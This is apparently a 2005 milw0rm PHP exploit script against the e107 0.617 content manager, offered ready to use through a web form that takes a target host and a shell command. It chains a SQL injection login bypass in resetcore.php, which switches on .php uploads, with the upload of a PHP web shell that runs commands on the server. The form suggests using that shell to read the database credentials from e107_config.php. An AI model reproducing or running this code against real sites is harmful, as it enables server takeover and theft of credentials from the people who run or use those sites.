<?php
#   0.27 18/10/2005                                                            #
#                                                                              #
#   ---e017_xpl.php                                                            #
#                                                                              #
#   e107 0.617 resetcore.php SQL Injection & remote code execution  all-in-one #
#                                                                              #
#                                 by rgod                                      #
#                      site: http://rgod.altervista.org                        #
#                                                                              #
#   make these changes in php.ini if you have troubles                         #
#   to launch this script:                                                     #
#   allow_call_time_pass_reference = on                                        #
#   register_globals = on                                                      #
#                                                                              #
#   usage: customize for your own pleasure, launch this script from Apache,    #
#   fill requested fields, then go!                                            #
#                                                                              #
#   Sun-Tzu: "There is a proper season for making attacks with fire, and       #
#   special days for starting a conflagration. The proper season is when       #
#   the weather is very dry; the special days are those when the moon is       #
#   in the constellations of the Sieve, the Wall, the Wing or the Cross-bar;   #
#   for these four are all days of rising wind."                               #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo'<html><head><title>e107 0.617 remote commands execution       </title><meta
http-equiv="Content-Type"   content="text/html;  charset=iso-8859-1">     <style
type="text/css"> body {	background-color:#111111; SCROLLBAR-ARROW-COLOR:#ffffff;
SCROLLBAR-BASE-COLOR: black;    CURSOR: crosshair;    color:   #1CB081; }    img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #1CBc81; } a:hover{text-decoration: underline;
color : #1CB081; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
e107 0.617 resetcore.php SQL injection & remote commands execution </p>      <p>
<class="Stile6"> a  script     byrgod  at <a href="http://rgod.altervista.org"
target="_blank">http://rgod.altervista.org</a></p> <table width="84%"><tr>   <td
width="43%">      <form name="form1" method="post" action="'.$SERVER[PHP_SELF].'
?path=value&host=value&port=value&command=value&proxy=value">   <p>       <input
type="text" name="host"><span class="Stile5"> hostname    (ex: www.sitename.com)
</span></p><p> <input type="text" name="path"><span class="Stile5">path (ex: /e1
07/ or just /)</span></p><p><input type="text" name="port"><span class="Stile5">
specify a port other than 80 (default value)  </span> </p> <p><input type="text"
name="command"><span class="Stile5">a shell command,    cat ./../../e107_config.
php to see database username/password  </span>  </p>  <p>   <input   type="text"
name="proxy"><span class="Stile5">send exploit through an HTTP  proxy  (ip:port)
</span></p><p><input type="submit" name="Submit" value="go!">   </p></form></td>
</tr></table></body></html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
echo "</tr></table>";
}


function sendpacket($packet)
{
global $proxy, $host, $port, $html;
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
	   $proxy=trim($proxy);
 	   $parts=explode(':',$proxy);
       echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}


if (($path<>'') and ($host<>'') and ($command<>''))
{

$port=intval($port);
if (($port=='') or ($port<=0)) {$port=80;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
echo 'Initiating exploit against '.htmlentities($host).':'.htmlentities($port);

#STEP 1 -> SQL INJECTION in resetcore.php, bypass login and change upload settings
$data.="sitename=e107+powered+website&siteurl=".urlencode('http://'.$host.':'.$port.$path)."
&sitebutton=button.png&sitetag=e107+website+system&sitedescription=&siteadmin=suntzu
&siteadminemail=fakefakefake@suntzu.com&sitetheme=e107v4a&admintheme=e107v4a
&sitedisclaimer=All+trademarks+are+%A9+their+respective+owners%2C+all+other+content+
is+%A9+e107+powered+website.%3Cbr+%2F%3Ee107+is+%A9+e107.org+2002%2F2003+and+is+released+under+the+%
3Ca+href%3D%27http%3A%2F%2Fwww.gnu.org%2F%27%3EGNU+GPL+license%3C%2Fa%3E.
&newsposts=10&flood_protect=1&flood_timeout=5&flood_time=30&flood_hits=100&anon_post=1
&user_reg=1&use_coppa=1&profanity_filter=1&profanity_replace=%5Bcensored%5D&chatbox_posts=10&
smiley_activate=&log_activate=&log_refertype=1&longdate=%25A+%25d+%25B+%25Y+-+%25H%3A%25M%3A%25S&
shortdate=%25d+%25b+%3A+%25H%3A%25M&forumdate=%25a+%25b+%25d+%25Y%2C+%25I%3A%25M%25p&sitelanguage=
English&maintainance_flag=0&time_offset=0&cb_linkc=+-link-+&cb_wordwrap=20&cb_linkreplace=1&
log_lvcount=10&meta_tag=&user_reg_veri=1&email_notify=0&forum_poll=0&forum_popular=10&forum_track=0&
forum_eprefix=%5Bforum%5D&forum_enclose=1&forum_title=Forums&forum_postspage=10&user_tracking=cookie&
cookie_name=e107cookie&resize_method=gd2&im_path=%2Fusr%2FX11R6%2Fbin%2Fconvert&im_quality=80&
im_width=120&im_height=100&upload_enabled=1&upload_allowedfiletype=.php&
upload_storagetype=2&upload_maxfilesize=&upload_class=254&cachestatus=&displayrendertime=1&
displaysql=&displaythemeinfo=1&link_submit=1&link_submit_class=0&timezone=GMT&search_restrict=1&
antiflood1=1&antiflood_timeout=10&autoban=1&coreedit_sub=Save+Core+Settings&a_name=";
$data.=urlencode("'or isnull(1/0)/*")."&a_password=d41d8cd98f00b204e9800998ecf8427e";
//                       ^                                  ^
//                       |                                  |
//            here we have login bypass ;)        hash of [nothing]
//so, you see, we activate public uploads and .php extensions for attachments
$packet="POST ".$p."e107_files/resetcore.php HTTP/1.1\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*\r\n";
$packet.="Referer: http://".$host.":".$port.$path."e107_files/resetcore.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Matrix S.p.A. - FAST Enterprise Crawler 6 (Unknown admin e-mail address)\r\n";
$packet.="Host: ".$host.":".$port."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Content-Type: multipart/form-data; boundary=----------W1dUnnWzZExD8Rb1Pctwsq\r\n\r\n";
$packet.=$data;

show($packet);
sendpacket($packet);
if (eregi("Core settings successfully updated",$html)) {echo '<br>Ok... we reset core values...Continue...';}
                                                  else {echo '<br>Exploit failed...'; die;}

#STEP 2 -> Upload a shell...
$data='------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name="file_name"

baby
------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name="file_version"

666
------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name="file_userfile[]"; filename="c:\suntzu.php"
Content-Type: multipart/form-data

<?php error_reporting(0); ini_set("max_execution_time",0);
echo "Hi Master\r\n"; system($HTTP_GET_VARS[cmd]); ?>
------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name="file_userfile[]"; filename=""


------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name="file_description"

mphhh....
------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name="file_website"


------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name="file_demo"


------------W1dUnnWzZExD8Rb1Pctwsq
Content-Disposition: form-data; name="upload"

Submit and Upload
------------W1dUnnWzZExD8Rb1Pctwsq--';

$packet="POST ".$p."upload.php HTTP/1.1\r\n";
$packet.="User-Agent: Nokia7110/1.0 (05.01) (Google WAP Proxy/1.0)\r\n";
$packet.="Host: ".$host.":".$port."\r\n";
$packet.="Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n";
$packet.="Accept-Language: it,en;q=0.9\r\n";
$packet.="Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\r\n";
$packet.="Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\r\n";
$packet.="Referer: http://".$host.":".$port.$path."upload.php\r\n";
$packet.="Cookie: e107cookie=1.dcc479d5ffe15c00b2263328f1d60da4\r\n";
$packet.="Cookie2: \$Version=1\r\n";
$packet.="Connection: Close, TE\r\n";
$packet.="TE: deflate, gzip, chunked, identity, trailers\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Content-Type: multipart/form-data; boundary=----------W1dUnnWzZExD8Rb1Pctwsq\r\n\r\n";
$packet.=$data;
show($packet);
sendpacket($packet);

#STEP 3 -> Launch commands...
$packet="GET ".$p."e107_files/public/suntzu.php?cmd=".urlencode($command)." HTTP/1.1\r\n";
$packet.="User-Agent: Website eXtractor\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet);
sendpacket($packet);
if (eregi("Hi Master",$html)) {echo 'Exploit succeeded...';}
                        else  {echo 'Exploit failed...';}
}
else
{echo 'Fill in requested fields, optionally specify a proxy...';}

?>

# milw0rm.com [2005-10-18]